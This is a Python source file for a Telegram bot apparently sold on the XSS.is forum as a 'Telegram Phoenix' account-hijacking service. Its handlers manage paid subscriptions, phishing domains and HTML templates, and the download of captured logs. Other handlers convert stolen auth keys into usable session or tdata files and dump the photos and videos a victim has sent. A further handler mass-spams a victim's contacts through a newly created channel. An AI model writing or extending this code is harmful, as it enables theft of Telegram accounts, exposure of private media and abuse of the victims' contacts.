import datetime
import os
import time

from aiogram import Dispatcher
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.handler import CancelHandler
from aiogram.types import Message, CallbackQuery
from aiogram.utils.markdown import hcode, hbold, hspoiler
import keyboards.inline as kb
import utils.database as db
import services.convertDate as convertDate
from services.crystalPay import create_invoice, get_invoice
from loader import bot
from misc.states import User
from opentele.api import UseCurrentSession
from opentele.tl import TelegramClient as ConvertClinet
from opentele.td import TDesktop
from aiogram.types import InputFile
import shutil
from telethon import TelegramClient
from telethon.tl.types import Authorization, InputMessagesFilterPhotos, InputMessagesFilterVideo, \
    InputMessagesFilterPhotoVideo, MessageMediaPhoto
from domain import add_domain, delete_domain, get_cert
from services.akey_to_telethon import prepare_account
import random
from telethon.sync import TelegramClient
from telethon import functions
from telethon.tl.types import User as TgUser
from random import randint
from data.config import load_config
import asyncio
API_ID = 2496
API_HASH = "8da85b0d5bfe62527e5b244c209159c3"
config = load_config(".env")


def to_zip(phone: str):
    shutil.make_archive(phone, 'zip', phone)
    shutil.rmtree(phone)
    return phone + '.zip'


def unpack_zip(file_name: str, dist: str):
    shutil.unpack_archive("tdata/" + file_name, dist)


async def send_menu(telegram_id):
    chat = await bot.get_chat(telegram_id)
    await db.add_new_user(telegram_id, chat.first_name)

    name, str_date = await db.get_date_and_name(telegram_id)
    mydomain = await db.get_domain_by_telegram_id(telegram_id) 
    mydomain = mydomain[0] if mydomain[0] else ""
    access_level = await db.get_access_level(telegram_id)
    date = convertDate.str_to_date(str_date)
    date_now = datetime.datetime.now()
    keyword = await db.get_keyword(telegram_id)
    keyword = "/" + keyword[0] if keyword[0] else ""
    if access_level == 1:
        subscribe_label = f": {hcode('Каждый 3-й лог')}"
    elif date > date_now:
        subscribe_label = f" до: {hcode(str_date)}"
    else:
        subscribe_label = f": {hcode('нет')}"

    await bot.send_message(telegram_id, f"🕊 Telegram Phoenix специально для XSS.is\n\n🆔 ID: {hcode(telegram_id)}\n👔 Nickname: {hbold(name)}\n🌐 Domain:  <code>{mydomain} {keyword}</code>\n\n"
                                        f"📅 Subscription{subscribe_label}", reply_markup=await kb.main_markup(telegram_id))

async def debug_add_log(message: Message, state: FSMContext):
    data = message.text.split(" ")[1]
    await db.add_new_log_data(message.from_user.id, data)
    await message.answer("success")

async def user_choose_interval_for_download(call: CallbackQuery):
    await call.message.edit_text(text="Выберите за какой период выгрузить логи.", reply_markup=kb.set_interval_markup())

async def user_confirm_download(call: CallbackQuery, callback_data: dict):
    
    logs = await db.get_logs_by_date(call.from_user.id, int(callback_data['interval']))
    if len(logs) <= 0:
        return await call.message.answer("Логов за этот период не найдено.")

    wait_message = await call.message.edit_text("⏳", reply_markup=None)
    filename = f"logs_storage/{call.from_user.id}.txt"
    with open(filename, "w+") as f:
        for log in logs:
            f.write(log + "\n")
    with open(filename, "rb") as f:
        await wait_message.delete()
        await bot.send_document(call.from_user.id, document=f, caption=f"Всего найдено: {len(logs)}")

async def user_start(message: Message, state: FSMContext):
    await state.finish()
    await send_menu(message.from_user.id)


async def buy_permit(call: CallbackQuery):
    await call.message.edit_reply_markup(await kb.price_of_subscribe_markup())


async def change_convert_status(call: CallbackQuery):
    await db.set_auto_convert_status(call.from_user.id)
    await call.message.edit_reply_markup(await kb.main_markup(call.from_user.id))


async def buy_permit_confirm(call: CallbackQuery, callback_data: dict):
    plan_id = int(callback_data.get("id"))
    invoice_id, url = await create_invoice(plan_id)
     
    await call.message.delete()
    await call.message.answer(f"🔗 Ссылка на оплату: {url}\n\n", reply_markup=await kb.check_payment_markup(invoice_id,
                                                                                                           plan_id))


async def check_payment(call: CallbackQuery, callback_data: dict):
    invoice_id = callback_data.get("invoice_id")
    plan_id = int(callback_data.get("type_purchase"))
    invoice = await get_invoice(invoice_id)
    if invoice:
        await call.message.edit_reply_markup()
        await call.message.edit_text(text="✅ Оплата прошла успешно! Для дальнейшей инструкции напишите владельцу")

        await db.set_access_level(call.from_user.id, 2)
        count_of_month = 1
        if plan_id == 1:
            count_of_month = 3
        elif plan_id == 2:
            count_of_month = 6
        elif plan_id == 3:
            count_of_month = 12

        date = datetime.datetime.now() + datetime.timedelta(days=count_of_month * 30)
        await db.set_date(call.from_user.id, date)
        await send_menu(call.from_user.id)
    else:
        await call.message.answer("❌ Оплата не прошла!")

async def set_domain_keyword(call: CallbackQuery):
    await call.message.answer("")
async def set_domain(call: CallbackQuery):
    await call.message.edit_text("Введите доменное имя | Перед тем как добавить ты должен перенаправить домен на NS-сервера который даст тебе ТС и подождать пока не получишь добро")
    await User.UserDomain.set()


async def set_domain_save(message: Message, state: FSMContext):
    check_domain = await db.get_domain(message.text)
    if check_domain is not None:
        await message.answer("❌ Доменное имя уже используется")
        await state.finish()
        raise CancelHandler()

    domain = await db.get_domain_by_telegram_id(message.from_user.id)
    domain = domain[0]
    if domain:
        if domain[0] is None:
            delete_domain(domain)

    # cert = get_cert(message.text)
    add_domain(message.text)
    await message.answer("Доменное имя сохранено", reply_markup=await kb.main_markup(message.from_user.id))
    await db.set_domain(message.from_user.id, message.text)

    await state.finish()


async def user_converter(call: CallbackQuery):
    await call.message.edit_reply_markup()
    await call.message.answer("Выберите тип конвертации", reply_markup=await kb.converter_markup())
    await User.UserConvertType.set()


async def user_converter_type(call: CallbackQuery, state: FSMContext):
    await state.update_data(auth_data=call.data)
    await call.message.edit_text(f"Отправьте {hcode(' auth_key:dc_id')}")
    await User.UserConvert.set()


async def user_converter_save_file(message: Message, state: FSMContext):
    data = await state.get_data()
    _type = data.get("auth_data").replace("converter_", "")

    auth_key, dc_id = message.text.split(":")

    random_chars = ''.join(random.sample(auth_key, 8))

    await state.finish()

    await prepare_account(dc_id, auth_key, random_chars, "sessions")
    client = TelegramClient(f"sessions/{random_chars}", API_ID, API_HASH)
    await client.connect()
    me = await client.get_me()

    if not me:
        await client.disconnect()
        await message.answer("❌ Акаунт не авторизован")
        raise CancelHandler()

    await message.answer(await get_stats(client, me))
    await client.disconnect()
    file = InputFile(f"sessions/{random_chars}.session")

    if "session" in _type:
        file = InputFile(f"sessions/{random_chars}.session")
    elif "tdata" in _type:
        client = ConvertClinet(f"sessions/{random_chars}.session")
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        tdesk.SaveTData(f"tdata/{random_chars}")
        to_zip("tdata/" + random_chars)
        file = InputFile(f"tdata/{random_chars}.zip")

    await bot.send_document(message.from_user.id, document=file)
    await send_menu(message.from_user.id)


async def user_spam(call: CallbackQuery):
    await call.message.answer("Отправьте .session")
    await User.UserSessionForSpam.set()


async def user_spam_save_file(message: Message, state: FSMContext):
    file_name = message.document.file_name
    await message.document.download(destination_file="sessions/" + file_name)
    await state.update_data(file_name=file_name)
    await message.answer("Отправьте текст для спама:")
    await User.UserTextForSpam.set()


async def user_spam_save_text(message: Message, state: FSMContext):
    await state.update_data(text=message.text)
    await message.answer("Отправьте название для чата:")

    await User.UserTitleForSpam.set()


async def start_spam(message: Message, state: FSMContext):
    data = await state.get_data()
    file_name = data.get("file_name")
    text = data.get("text")
    title = message.text
    await message.answer("Спам запущен!")
    await state.finish()

    client = TelegramClient(f'sessions/{file_name}', 2496, '8da85b0d5bfe62527e5b244c209159c3')
    await client.connect()
    if True:
        me = await client.get_me()
        if me:
            await message.answer("Аккаунт авторизован")
        else:
            await message.answer("Аккаунт не авторизован")
            raise CancelHandler()
        users = []

        contacts = await client(functions.contacts.GetContactsRequest(
            hash=randint(1, 999999999999)
        ))

        for contact in contacts.users:
            users.append(contact)
        print(f"users count: {len(users)}")

        await asyncio.sleep(3)

        async for dialog in client.iter_dialogs():
            if isinstance(dialog.entity, TgUser) and dialog.id not in users:
                if not dialog.entity.bot and not dialog.entity.deleted:
                    users.append(dialog.entity)

        await asyncio.sleep(3)

        chat_created = await client(functions.messages.CreateChannelRequest(
            users=users,
            title=title
        ))

        await asyncio.sleep(3)

        message = await client.send_message(chat_created.chats[0], text)

        await asyncio.sleep(1)

        result_pin = await client(functions.messages.UpdatePinnedMessageRequest(
            peer=chat_created.chats[0].id,
            id=message.id,
            unpin=False,
            pm_oneside=False
        ))


async def user_dump(call: CallbackQuery):
    dump_access = await db.get_dump_access(call.from_user.id)
    if dump_access:
        await call.message.answer("Отправьте .session")
        await User.UserDump.set()


async def get_stats(client, me):
    dialogs = client.iter_dialogs()
    dialogs_count = 0
    owner_channel = 0
    group = 0
    async for dialog in dialogs:
        dialogs_count += 1
        if dialog.is_channel:
            if dialog.entity.creator or dialog.entity.admin_rights:
                owner_channel += 1
        if dialog.is_group:
            group += 1
        else:
            continue

    return f"""✉️ Всего диалогов: {dialogs_count}
📢 Групп: {group}
💎 Управление: {owner_channel}

⚙️ ID: <code>{me.id}</code>
🐘 Никнейм: {me.first_name}
👤 Юзернейм: @{me.username}
⭐️ Премиум: {me.premium}
⛔️ Скам: {me.scam}"""


async def user_dump_save(message: Message, state: FSMContext):
    await state.finish()
    file_name = message.document.file_name
    await message.document.download(destination_file="sessions/" + file_name)

    session = 'sessions/' + file_name

    client = TelegramClient(session, 2496, '8da85b0d5bfe62527e5b244c209159c3')
    await client.connect()
    me = await client.get_me()

    await message.answer(await get_stats(client, me))

    msgs_for_damp = []
    await message.answer('⏳ Начался сбор сообщений')
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            if dialog.entity.bot:
                continue
            if dialog.id == 777000:
                continue
            async for msg in client.iter_messages(dialog, filter=InputMessagesFilterPhotoVideo, from_user=me):
                msgs_for_damp.append(msg)
    if msgs_for_damp:
        count_dump = len(msgs_for_damp)
        status_msg = await message.answer(f'✅ Найдено {count_dump} сообщений!')
        path = f'dumps/{me.id}-{int(time.time())}'
        path_photo = f'dumps/{me.id}-{int(time.time())}/photo'
        path_video = f'dumps/{me.id}-{int(time.time())}/video'
        os.mkdir(path)
        os.mkdir(path_photo)
        count = 0
        video = []
        for msg in msgs_for_damp:
            await status_msg.edit_text(f'⏰ Статус скачивания: {count}/{count_dump}')
            media: MessageMediaPhoto = msg.media
            try:
                if msg.media.photo:
                    try:
                        await client.download_media(msg, file=path_photo, thumb=len(media.photo.sizes) - 2 if len(
                            media.photo.sizes) > 3 else 1)
                    except Exception as e:
                        print(e)
                count += 1

            except AttributeError:
                video.append(msg)

                count += 1
        await status_msg.reply_document(InputFile(to_zip(path_photo)), caption='📸 Фото')
        if video:
            os.mkdir(path_video)
            for msg in video:
                try:
                    await client.download_media(msg, file=path_video)
                except Exception as e:
                    print(e)

        path_to_video = to_zip(path_video)
        await status_msg.reply_document(InputFile(path_to_video), caption='🎥 Видео')

    else:
        await message.answer('❌ Нет файлов для дампа')

    await client.disconnect()


async def user_get_stats(call: CallbackQuery):
    stats = await db.get_stats()
    text = f"📊 Статистика:\n\n"
    for stat in stats:
        text += f"{stat[0]}: {stat[1]}\n"

    await call.message.edit_text(text, reply_markup=await kb.go_main_markup())


async def go_menu(call: CallbackQuery):
    await call.message.delete()
    await send_menu(call.from_user.id)


async def get_ssl(call: CallbackQuery, state: FSMContext):
    domain = await db.get_domain_by_telegram_id(call.from_user.id)
    get_cert(domain[0])
    await call.message.edit_text("Получение SSL сертификата завершено")
    await state.reset_state()


# templates
async def templates_view(message: Message, telegram_id: int):
    template, template_status = await db.get_template_status(telegram_id)
    message_label = "Чтобы включить шаблоны, используйте кнопку ниже."
    if template_status:
        message_label = f"Шаблон включены\nШаблон: <code>{template if template else 'не установлен.'}</code>"

    try:
        await message.edit_text(message_label, reply_markup=kb.choose_template_markup(template_status))
    except:
        await message.answer(message_label, reply_markup=kb.choose_template_markup(template_status))

async def user_templates(call: CallbackQuery):
    await templates_view(call.message, call.from_user.id)

async def user_switch_templates(call: CallbackQuery):
    await db.switch_templates(call.from_user.id)
    await templates_view(call.message, call.from_user.id)

def list_of_templates() -> list:
    return [item for item in os.listdir(config.misc.temlates_path) if item.endswith(".html")]


def get_prettify_list_of_templates() -> list:
    pretty_string = ""
    for i, item in enumerate(list_of_templates()):
        pretty_string += f"{i + 1}. {hbold(item)}\n"
    return pretty_string


async def user_change_template(call: CallbackQuery):
    await call.message.edit_text(f"{get_prettify_list_of_templates()}\nВыберите шаблон из списка.")
    await User.UserChangeTemplate.set()

async def user_change_template_confirmation(message: Message, state: FSMContext):
    entered_text = message.text
    if entered_text.isdigit():
        entered_number = int(entered_text) - 1
        html_files = list_of_templates()

        if 0 <= entered_number < len(html_files):
            await db.set_template(message.from_user.id, html_files[entered_number])
        else:
            await message.answer("Ошибка. Вы указали неправильный номер.")
    else:
        await message.answer("Ошибка, Вы не ввели число.")
    
    await state.reset_state()
    await templates_view(message, message.from_user.id)

#

# key
async def user_set_key(call: CallbackQuery):
    await call.message.answer("Введите ключ для домена:")
    await User.UserSetKey.set()

async def user_set_key_confirm(message: Message, state: FSMContext):
    await db.set_key(message.from_user.id, message.text)
    await message.answer("Ключ установлен.")
    await state.reset_state()
    await send_menu(message.from_user.id)
#
def register_user(dp: Dispatcher):
    dp.register_message_handler(user_start, commands=["start"], state="*")
    dp.register_callback_query_handler(change_convert_status, text="auto_convert", state="*")

    dp.register_callback_query_handler(buy_permit, text="buy-permit")
    dp.register_callback_query_handler(buy_permit_confirm, kb.price_markup.filter())
    dp.register_callback_query_handler(check_payment, kb.check_markup.filter(), state="*")

    dp.register_callback_query_handler(set_domain, text="add_domain")
    dp.register_message_handler(set_domain_save, state=User.UserDomain)

    dp.register_callback_query_handler(user_converter, text="converter")
    dp.register_callback_query_handler(user_converter_type, text_contains="converter_", state=User.UserConvertType)
    dp.register_message_handler(user_converter_save_file, state=User.UserConvert)

    dp.register_callback_query_handler(user_dump, text="dump")
    dp.register_message_handler(user_dump_save, state=User.UserDump, content_types=["document"])

    dp.register_callback_query_handler(user_get_stats, text="get_stats")
    dp.register_callback_query_handler(go_menu, text="go_menu")

    dp.register_callback_query_handler(get_ssl, text="get_ssl")

    dp.register_callback_query_handler(user_spam, text="start_spam")
    dp.register_message_handler(user_spam_save_file, state=User.UserSessionForSpam, content_types=["document"])
    dp.register_message_handler(user_spam_save_text, state=User.UserTextForSpam)
    dp.register_message_handler(start_spam, state=User.UserTitleForSpam)
    
    # download logs
    dp.register_callback_query_handler(user_choose_interval_for_download, text="download_logs")
    dp.register_callback_query_handler(user_confirm_download, kb.download_markup.filter())

    # templates
    dp.register_callback_query_handler(user_templates, text_contains="user_templates")
    dp.register_callback_query_handler(user_switch_templates, text_contains="switch_template")
    dp.register_callback_query_handler(user_change_template, text_contains="change_template")
    dp.register_message_handler(user_change_template_confirmation, state=User.UserChangeTemplate)

    # keyword
    dp.register_callback_query_handler(user_set_key, text_contains="set_key")
    dp.register_message_handler(user_set_key_confirm, state=User.UserSetKey)

    # debug
    dp.register_message_handler(debug_add_log, text_contains="/add_log")
